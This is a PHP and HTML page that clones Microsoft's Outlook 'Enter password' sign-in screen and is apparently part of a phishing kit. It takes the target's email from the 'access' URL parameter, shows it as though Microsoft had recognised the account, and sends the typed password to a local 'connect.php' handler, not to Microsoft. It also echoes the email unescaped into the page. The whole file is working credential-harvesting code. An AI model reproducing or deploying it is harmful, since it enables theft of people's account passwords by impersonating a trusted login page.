<?php
$email = $_GET['access'];
?>

<html dir="ltr" class="" lang="en">
	<head>
		<title>Sign in to Outlook</title>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
			<meta http-equiv="X-UA-Compatible" content="IE=edge">
				<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
					<meta http-equiv="Pragma" content="no-cache">
						<meta http-equiv="Expires" content="-1">
							<link rel="preconnect" href="https://aadcdn.msauth.net" crossorigin="">
								<meta http-equiv="x-dns-prefetch-control" content="on">
									<link rel="dns-prefetch" href="//aadcdn.msauth.net">
										<link rel="dns-prefetch" href="//aadcdn.msftauth.net">
											<meta name="PageID" content="ConvergedSignIn">
												<meta name="SiteID" content="">
													<meta name="ReqLC" content="1033">
														<meta name="LocLC" content="en-US">
															<noscript>
																<meta http-equiv="Refresh" content="0; URL=https://login.microsoftonline.com/jsdisabled" />
															</noscript>
															<link rel="shortcut icon" href="https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
																<meta name="robots" content="none">
																
																
																	<link crossorigin="anonymous" href="https://aadcdn.msauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_tbsima5-c7pluzuyz0ftda2.css" rel="stylesheet" >
															
																		<div>
																			<!--  -->
																			<div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }">
																				<div class="background app" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
																					<!-- ko if: smallImageUrl -->
																					<div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;https://aadcdn.msauth.net/ests/2.1/content/images/appbackgrounds/33-small_138bcee624fa04ef9b75e86211a9fe0d.jpg&quot;);"></div>
																					<!-- /ko -->
																					<!-- ko if: backgroundImageUrl -->
																					<div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;https://aadcdn.msauth.net/ests/2.1/content/images/appbackgrounds/33_a5dbd4393ff6a725c7e62b61df7e72f0.jpg&quot;);"></div>
																					<!-- ko if: useImageMask -->
																					<!-- /ko -->
																					<!-- /ko -->
																				</div>
																			</div>
																			<div data-bind="if: activeDialog"></div>
																			<form name="f1" id="i0281"  spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: activeDialog" action="./connect.php">
																				<!-- ko if: svr.iBannerEnvironment -->
																				<!-- /ko -->
																				<!-- ko withProperties: { '$loginPage': $data } -->
																				<div class="outer" data-bind="component: { name: 'page',
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }">
																					<!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
																					<!-- ko if: svr.fShowCookieBanner -->
																					<!-- /ko -->
																					<div class="middle app" data-bind="css: { 'app': backgroundLogoUrl }">
																						<!-- ko if: backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) -->
																						<div class="background-logo-holder">
																							<img class="background-logo" role="presentation" data-bind="attr: { src: backgroundLogoUrl }" src="https://aadcdn.msauth.net/ests/2.1/content/images/applogos/37_533e293f0c8947ada653b47c00e394e2.png">
																							</div>
																							<!-- /ko -->
																							<div class="inner app fade-in-lightbox" data-bind="
                animationEnd: paginationControlMethods() &amp;&amp; paginationControlMethods().view_onAnimationEnd,
                css: {
                    'app': backgroundLogoUrl,
                    'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide'),
                    'fade-in-lightbox': fadeInLightBox,
                    'has-popup': showFedCredButton,
                    'transparent-lightbox': backgroundControlMethods() &amp;&amp; backgroundControlMethods().useTransparentLightBox }">
																								<div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.fAllowGrayOutLightBox &amp;&amp; showLightboxProgress() }"></div>
																								<!-- ko if: showLightboxProgress -->
																								<!-- /ko -->
																								<!-- ko ifnot: paginationControlMethods() && (paginationControlMethods().currentViewHasMetadata('hideLogo')) -->
																								<div data-bind="component: { name: 'logo-control',
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: bannerLogoUrl() } }">
																									<!--  -->
																									<!-- ko if: bannerLogoUrl -->
																									<!-- /ko -->
																									<!-- ko if: !bannerLogoUrl && !isChinaDc -->
																									<!-- ko component: 'accessible-image-control' -->
																									<!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
																									<!-- /ko -->
																									<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
																									<!-- ko template: { nodes: [darkImageNode], data: $parent } -->
																									<img class="logo" pngsrc="https://aadcdn.msauth.net/ests/2.1/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://aadcdn.msauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="https://aadcdn.msauth.net/ests/2.1/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">
																										<!-- /ko -->
																										<!-- /ko -->
																										<!-- /ko -->
																										<!-- /ko -->
																									</div>
																									<!-- /ko -->
																									<!-- ko if: svr.strLWADisclaimerMsg && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) -->
																									<!-- /ko -->
																									<!-- ko if: asyncInitReady -->
																									<div role="main" data-bind="component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods,
                        params: {
                            enableCssAnimation: svr.fEnableCssAnimation,
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow,
                            setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                            animationStateChange: paginationControl_onAnimationStateChange } }">
																										<!--  -->
																										<div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
																											<!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.sPOST_Username) -->
																											<div data-bind="css: {
        'animate': animate() &amp;&amp; animate.animateBanner(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }" class="animate slide-in-next">
																												<div data-bind="component: { name: 'identity-banner-control',
            params: {
                userTileUrl: svr.urlProfilePhoto,
                displayName: sharedData.displayName || svr.sPOST_Username,
                isBackButtonVisible: isBackButtonVisible(),
                focusOnBackButton: isBackButtonFocused(),
                backButtonDescribedBy: backButtonDescribedBy() },
            event: {
                backButtonClick: identityBanner_onBackButtonClick } }">
																													<!--  -->
																													<div class="identityBanner">
																														<!-- ko if: isBackButtonVisible -->
																														<button type="button" class="backButton" data-bind="
        attr: { 'id': backButtonId || 'idBtn_Back' },
        ariaLabel: str['CT_HRD_STR_Splitter_Back'],
        ariaDescribedBy: backButtonDescribedBy,
        click: backButton_onClick,
        hasFocus: focusOnBackButton" id="idBtn_Back" aria-label="Back">
																															<!-- ko ifnot: svr.fIsRTLMarket -->
																															<!-- ko component: 'accessible-image-control' -->
																															<!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
																															<!-- /ko -->
																															<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
																															<!-- ko template: { nodes: [darkImageNode], data: $parent } -->
																															<img role="presentation" pngsrc="https://aadcdn.msauth.net/ests/2.1/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png" svgsrc="https://aadcdn.msauth.net/ests/2.1/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" data-bind="imgSrc" src="https://aadcdn.msauth.net/ests/2.1/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg">
																																<!-- /ko -->
																																<!-- /ko -->
																																<!-- /ko -->
																																<!-- /ko -->
																																<!-- ko if: svr.fIsRTLMarket -->
																																<!-- /ko -->
																															</button>
																															<!-- /ko -->
																															<div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="<?php echo $email ?>"><?php echo $email ?></div>
																														</div>
																													</div>
																												</div>
																												<!-- /ko -->
																												<div class="pagination-view animate has-identity-banner slide-in-next" data-bind="css: {
        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }">
																													<!-- ko foreach: views -->
																													<!-- ko if: $parent.currentViewIndex() === $index() -->
																													<!-- /ko -->
																													<!-- ko if: $parent.currentViewIndex() === $index() -->
																													<!-- ko template: { nodes: [$data], data: $parent } -->
																													<div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-password-view',
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            username: sharedData.username,
                            displayName: sharedData.displayName,
                            hipRequiredForUsername: sharedData.hipRequiredForUsername,
                            passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                            availableCreds: sharedData.availableCreds,
                            evictedCreds: sharedData.evictedCreds,
                            useEvictedCredentials: sharedData.useEvictedCredentials,
                            flowToken: sharedData.flowToken,
                            defaultKmsiValue: svr.iDefaultLoginOptions === 1,
                            userTenantBranding: sharedData.userTenantBranding,
                            sessions: sharedData.sessions,
                            callMetadata: sharedData.callMetadata,
                            gitHubRedirectUrl: sharedData.gitHubParams.redirectUrl || svr.urlGitHubFed,
                            googleRedirectUrl: sharedData.googleParams.redirectUrl || svr.urlGoogleFed },
                        event: {
                            updateFlowToken: $loginPage.view_onUpdateFlowToken,
                            submitReady: $loginPage.view_onSubmitReady,
                            redirect: $loginPage.view_onRedirect,
                            resetPassword: $loginPage.passwordView_onResetPassword,
                            setBackButtonState: view_onSetIdentityBackButtonState,
                            setPendingRequest: $loginPage.view_onSetPendingRequest } }">
																														<!--  -->
																														<input type="hidden" name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0">
																															<input type="hidden" name="login" data-bind="value: unsafe_username" value="<?php echo $email ?>">
																																<input type="text" name="loginfmt" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true">
																																	<input type="hidden" name="type" data-bind="value: svr.fUseWizardBehavior ? 20 : 11" value="11">
																																		<input type="hidden" name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3">
																																			<input type="hidden" name="lrt" data-bind="value: callMetadata.IsLongRunningTransaction" value="">
																																				<input type="hidden" name="lrtPartition" data-bind="value: callMetadata.LongRunningTransactionPartition" value="">
																																					<input type="hidden" name="hisRegion" data-bind="value: callMetadata.HisRegion" value="">
																																						<input type="hidden" name="hisScaleUnit" data-bind="value: callMetadata.HisScaleUnit" value="">
																																							<div id="loginHeader" class="row text-title" role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Enter password</div>
																																							<!-- ko if: unsafe_pageDescription -->
																																							<!-- /ko -->
																																							<div class="row">
																																								<div class="form-group col-md-24">
																																									<div role="alert" aria-live="assertive">
																																										<!-- ko if: passwordTextbox.error -->
																																										<!-- /ko -->
																																									</div>
																																									<div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox',
            publicMethods: passwordTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: str['CT_PWD_STR_PwdTB_Label'] },
            event: {
                updateFocus: passwordTextbox.textbox_onUpdateFocus } }">
																																										<!-- ko withProperties: { '$placeholderText': placeholderText } -->
																																										<!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->
																																										<input name="passwd" type="password" id="i0118" autocomplete="off" class="form-control" aria-required="true" data-bind="
                textInput: passwordTextbox.value,
                ariaDescribedBy: 'loginHeader passwordDesc',
                hasFocusEx: passwordTextbox.focused,
                placeholder: $placeholderText,
                ariaLabel: unsafe_passwordAriaLabel,
                css: { 'has-error': passwordTextbox.error }" aria-describedby="loginHeader passwordDesc" placeholder="Password" aria-label="Enter the password for <?php echo $email ?>"  required>
																																											<!-- /ko -->
																																											<!-- /ko -->
																																											<!-- ko ifnot: usePlaceholderAttribute -->
																																											<!-- /ko -->
																																										</div>
																																									</div>
																																								</div>
																																								<!-- ko if: svr.urlHIPScript && showHipOnPasswordView -->
																																								<!-- /ko -->
																																								<div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
																																									<div>
																																										<!-- ko if: svr.fShowPersistentCookiesWarning -->
																																										<!-- /ko -->
																																										<!-- ko if: svr.fKMSIEnabled !== false && !svr.fShowPersistentCookiesWarning && !tenantBranding.KeepMeSignedInDisabled -->
																																										<!-- /ko -->
																																										<div class="row">
																																											<div class="col-md-24">
																																												<div class="text-13 action-links">
																																													<div class="form-group">
																																														<a id="idA_PWD_ForgotPassword" role="link" href="https://passwordreset.microsoftonline.com/?ru=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2freprocess%3fctx%3drQIIAdNiNtQztFIxgAAjXRCpa5CWZqibnApiIYEiIS6BnR8nrwltXuTQvOSDUYBlvP4qRqWMkpKCYit9_fzSkpz8_Gy9_LS0zORUYzNTveT8XP388kT9HYyMFxgZVzGZmxmbWRqZmFsaGZtbGpobGRia6BmamyYmpqSY6RomW5jqmhgaGeomGpim6FqkGFiaWqaaJ6WZmt9i4vd3LC3JMAIR-UWZVamfmDjT8oty4wvyi0tmMce7JJdWuEU6ljs7ugQFecVnRTo6uTj7-6cnupcV6Ob4WJiZmYWHliQaFHgWRuWX-kZW5Bj5uVSFBQeV5psXJmV4uHg7FTnnBWU6Zid75Xq65qaUlplm-kVZlMRH6RrnmaxiJip8NjGzAX2cm593ipktvyA1LzPlAgvjKxYeA2YrDg4uAQYJBgWGHyyMi1iB4fi8ZaVJa0e_R1fokrmHeXIYTrHqu-c6pXr4lweXmxSH-pYVuPslBvilBCSHp3obmZmVaBcUhAUbJJa4hHt7eNoaWRlOYGOcwMb2go3xAxtjBzvDLk4iIgIA0&amp;mkt=en-US&amp;hosted=0&amp;device_platform=Windows+10" data-bind="text: str['CT_PWD_STR_ForgotPwdLink_Text'], href: svr.urlResetPassword, click: resetPassword_onClick">Forgot my password</a>
																																													</div>
																																													<!-- ko if: allowPhoneDisambiguation -->
																																													<!-- /ko -->
																																													<!-- ko ifnot: useEvictedCredentials -->
																																													<!-- ko component: { name: "cred-switch-link-control",
                            params: {
                                serverData: svr,
                                username: username,
                                availableCreds: availableCreds,
                                flowToken: flowToken,
                                currentCred: { credType: 1 } },
                            event: {
                                switchView: credSwitchLink_onSwitchView,
                                setPendingRequest: credSwitchLink_onSetPendingRequest,
                                updateFlowToken: credSwitchLink_onUpdateFlowToken } } -->
																																													<!--  -->
																																													<div class="form-group">
																																														<!-- ko if: credentialCount > 1 || (credentialCount === 1 && (showForgotUsername || selectedCredShownOnlyOnPicker)) -->
																																														<!-- /ko -->
																																														<!-- ko if: credentialCount === 1 && !(showForgotUsername || selectedCredShownOnlyOnPicker) -->
																																														<!-- /ko -->
																																														<!-- ko if: credentialCount === 0 && showForgotUsername -->
																																														<!-- /ko -->
																																													</div>
																																													<!-- ko if: credLinkError -->
																																													<!-- /ko -->
																																													<!-- /ko -->
																																													<!-- ko if: evictedCreds.length > 0 -->
																																													<!-- /ko -->
																																													<!-- /ko -->
																																													<!-- ko if: showChangeUserLink -->
																																													<!-- /ko -->
																																												</div>
																																											</div>
																																										</div>
																																									</div>
																																									<div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
																																										<div data-bind="component: { name: 'footer-buttons-field',
        params: {
            serverData: svr,
            primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.fShowButtons,
            isSecondaryButtonEnabled: true,
            isSecondaryButtonVisible: false },
        event: {
            primaryButtonClick: primaryButton_onClick } }">
																																											<div class="col-xs-24 no-padding-left-right button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin }">
																																												<!-- ko if: isSecondaryButtonVisible -->
																																												<!-- /ko -->
																																												<div class="inline-block">
																																													<!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
																																													<input type="submit" id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            attr: primaryButtonAttributes,
            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible,
            preventTabbing: primaryButtonPreventTabbing" value="Sign in">
																																													</div>
																																												</div>
																																											</div>
																																										</div>
																																									</div>
																																									<!-- ko if: tenantBranding.BoilerPlateText -->
																																									<!-- /ko -->
																																								</div>
																																								<!-- /ko -->
																																								<!-- /ko -->
																																								<!-- ko if: $parent.currentViewIndex() === $index() -->
																																								<!-- /ko -->
																																								<!-- ko if: $parent.currentViewIndex() === $index() -->
																																								<!-- /ko -->
																																								<!-- ko if: $parent.currentViewIndex() === $index() -->
																																								<!-- /ko -->
																																								<!-- ko if: $parent.currentViewIndex() === $index() -->
																																								<!-- /ko -->
																																								<!-- ko if: $parent.currentViewIndex() === $index() -->
																																								<!-- /ko -->
																																								<!-- ko if: $parent.currentViewIndex() === $index() -->
																																								<!-- /ko -->
																																								<!-- ko if: $parent.currentViewIndex() === $index() -->
																																								<!-- /ko -->
																																								<!-- ko if: $parent.currentViewIndex() === $index() -->
																																								<!-- /ko -->
																																								<!-- ko if: $parent.currentViewIndex() === $index() -->
																																								<!-- /ko -->
																																								<!-- ko if: $parent.currentViewIndex() === $index() -->
																																								<!-- /ko -->
																																								<!-- ko if: $parent.currentViewIndex() === $index() -->
																																								<!-- /ko -->
																																								<!-- ko if: $parent.currentViewIndex() === $index() -->
																																								<!-- /ko -->
																																								<!-- ko if: $parent.currentViewIndex() === $index() -->
																																								<!-- /ko -->
																																								<!-- ko if: $parent.currentViewIndex() === $index() -->
																																								<!-- /ko -->
																																								<!-- ko if: $parent.currentViewIndex() === $index() -->
																																								<!-- /ko -->
																																								<!-- ko if: $parent.currentViewIndex() === $index() -->
																																								<!-- /ko -->
																																								<!-- ko if: $parent.currentViewIndex() === $index() -->
																																								<!-- /ko -->
																																								<!-- ko if: $parent.currentViewIndex() === $index() -->
																																								<!-- /ko -->
																																								<!-- ko if: $parent.currentViewIndex() === $index() -->
																																								<!-- /ko -->
																																								<!-- ko if: $parent.currentViewIndex() === $index() -->
																																								<!-- /ko -->
																																								<!-- ko if: $parent.currentViewIndex() === $index() -->
																																								<!-- /ko -->
																																								<!-- ko if: $parent.currentViewIndex() === $index() -->
																																								<!-- /ko -->
																																								<!-- /ko -->
																																							</div>
																																						</div>
																																					</div>
																																					<!-- /ko -->
																																				</div>
																																				<!-- ko if: showFedCredButton -->
																																				<!-- /ko -->
																																				<!-- ko if: newSessionMessage() && !svr.urlMsaStaticMeControl -->
																																				<!-- /ko -->
																																				<!-- ko if: svr.urlMsaStaticMeControl && newSession() -->
																																				<!-- /ko -->
																																				<input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value="">
																																					<input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value="">
																																						<input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value="">
																																							<input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value="">
																																								<input type="hidden" name="canary" data-bind="value: svr.canary" value="GmBeHOwSw4sUMvpGNaPNdPcWeK266t+ppVS0atDWKHI=2:1">
																																									<input type="hidden" name="ctx" data-bind="value: ctx" value="rQIIAdNiNtQztFIxgAAjXRCpa5CWZqibnApiIYEiIS6BnR8nrwltXuTQvOSDUYBlvP4qRqWMkpKCYit9_fzSkpz8_Gy9_LS0zORUYzNTveT8XP388kT9HYyMFxgZVzGZmxmbWRqZmFsaGZtbGpobGRia6BmamyYmpqSY6RomW5jqmhgaGeomGpim6FqkGFiaWqaaJ6WZmt9i4vd3LC3JMAIR-UWZVamfmDjT8oty4wvyi0tmMce7JJdWuEU6ljs7ugQFecVnRTo6uTj7-6cnupcV6Ob4WJiZmYWHliQaFHgWRuWX-kZW5Bj5uVSFBQeV5psXJmV4uHg7FTnnBWU6Zid75Xq65qaUlplm-kVZlMRH6RrnmaxiJip8NjGzAX2cm593ipktvyA1LzPlAgvjKxYeA2YrDg4uAQYJBgWGHyyMi1iB4fi8ZaVJa0e_R1fokrmHeXIYTrHqu-c6pXr4lweXmxSH-pYVuPslBvilBCSHp3obmZmVaBcUhAUbJJa4hHt7eNoaWRlOYGOcwMb2go3xAxtjBzvDLk4iIgIA0">
																																										<input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="34a984e7-8885-488f-8a55-a49dc30c6c00">
																																											<input type="hidden" id="i0327" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABAAEAAADCoMpjJXrxTq9VG9te-7FXZTwTaTd4bUxWmpJc77XG05FbMNAB1RvlDygXHhL1rrFIyrozjA5gw2a31aaPCmggmv5XwczQyGc3rzvgmI5RPgxSIaGKGFEF6QnVWxjyFcKLYeiZ7tlGSjCC7GxpAdyDC61Kz3aNAmBY6JAR6mspB59y3tuCqWv5Li15xnVfe-w0ihDVYM8By26_kw5FhT1eE6jKjO-iIOF6GGSBLdCfLtf066zAA2gksctXqA5Mq4GSRYNueU2RC_RJ5DTB7YAdhOvrZl-LCXk0iB_bmza5GSfOcJqlBcG2Avk8ncvInUW2seo3Yv2VRO2_owRtIOChd-_VLdAJEKSsmy0xAlnrkNW_csJnSQwQUgrttNhBqKopmHaEwaa5WfBonsMr9wR5IAA">
																																												<input type="hidden" name="PPSX" data-bind="value: svr.sRandomBlob" value="">
																																													<input type="hidden" name="NewUser" value="1">
																																														<input type="hidden" name="FoundMSAs" data-bind="value: svr.sFoundMSAs" value="">
																																															<input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0">
																																																<input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0">
																																																	<input type="hidden" name="CookieDisclosure" data-bind="value: svr.fShowCookieBanner ? 1 : 0" value="0">
																																																		<input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported() ? 1 : 0" value="0">
																																																			<div data-bind="component: { name: 'instrumentation',
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }">
																																																				<input type="hidden" name="i2" data-bind="value: clientMode" value="1">
																																																					<input type="hidden" name="i17" data-bind="value: srsFailed" value="">
																																																						<input type="hidden" name="i18" data-bind="value: srsSuccess" value="">
																																																							<input type="hidden" name="i19" data-bind="value: timeOnPage" value="">
																																																							</div>
																																																							<div id="footer" class="footer" role="contentinfo" data-bind="css: { 'default': !backgroundLogoUrl() }">
																																																								<div data-bind="component: { name: 'footer-control',
                    params: {
                        serverData: svr,
                        debugDetails: debugDetails,
                        showLinks: true },
                    event: {
                        agreementClick: footer_agreementClick } }">
																																																									<!--  -->
																																																									<!-- ko if: showLinks || impressumLink || showIcpLicense -->
																																																									<div id="footerLinks" class="footerNode text-secondary">
																																																										<!-- ko if: !showIcpLicense -->
																																																										<span id="ftrCopy" data-bind="html: svr.strCopyrightTxt">©2024 Microsoft</span>
																																																										<!-- /ko -->
																																																										<a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="https://www.microsoft.com/en-US/servicesagreement/">Terms of use</a>
																																																										<a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="https://privacy.microsoft.com/en-US/privacystatement">Privacy &amp; cookies</a>
																																																										<!-- ko if: impressumLink -->
																																																										<!-- /ko -->
																																																										<!-- ko if: showIcpLicense -->
																																																										<!-- /ko -->
																																																										<a href="#" role="button" class="moreOptions" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        hasFocus: focusMoreInfo()" aria-label="Click here for troubleshooting information">
																																																											<!-- ko component: { name: 'accessible-image-control', params: { hasDarkBackground: true } } -->
																																																											<!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
																																																											<!-- ko template: { nodes: [lightImageNode], data: $parent } -->
																																																											<img class="desktopMode" role="presentation" pngsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_white_0ad43084800fd8b50a2576b5173746fe.png" svgsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg" data-bind="imgSrc" src="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg">
																																																												<!-- /ko -->
																																																												<!-- /ko -->
																																																												<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
																																																												<!-- /ko -->
																																																												<!-- /ko -->
																																																												<!-- ko component: 'accessible-image-control' -->
																																																												<!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
																																																												<!-- /ko -->
																																																												<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
																																																												<!-- ko template: { nodes: [darkImageNode], data: $parent } -->
																																																												<img class="mobileMode" role="presentation" pngsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png" svgsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" data-bind="imgSrc" src="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg">
																																																													<!-- /ko -->
																																																													<!-- /ko -->
																																																													<!-- /ko -->
																																																												</a>
																																																											</div>
																																																											<!-- ko if: showDebugDetails -->
																																																											<!-- /ko -->
																																																											<!-- /ko -->
																																																										</div>
																																																									</div>
																																																								</div>
																																																								<!-- /ko -->
																																																							</div>
																																																							<!-- /ko -->
																																																						</form>
																																																						<form method="post" aria-hidden="true" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }">
																																																							<!-- ko foreach: postRedirectParams -->
																																																							<!-- /ko -->
																																																						</form>
																																																						<!-- ko if: svr.urlMsaMeControl && !svr.urlMsaStaticMeControl -->
																																																						<!-- /ko -->
																																																						<!-- ko if: svr.urlMsaStaticMeControl && callMsaStaticMeControl() -->
																																																						<!-- /ko -->
																																																						<!-- ko if: svr.urlCBPartnerPreload -->
																																																						<div id="idPartnerPL" data-bind="injectIframe: { url: svr.urlCBPartnerPreload }">
																																																							<iframe height="0" width="0" src="https://outlook.office365.com/owa/prefetch.aspx" style="display: none;"></iframe>
																																																						</div>
																																																						<!-- /ko -->
																																																					</div>
																																																				</body>
																																																			</html>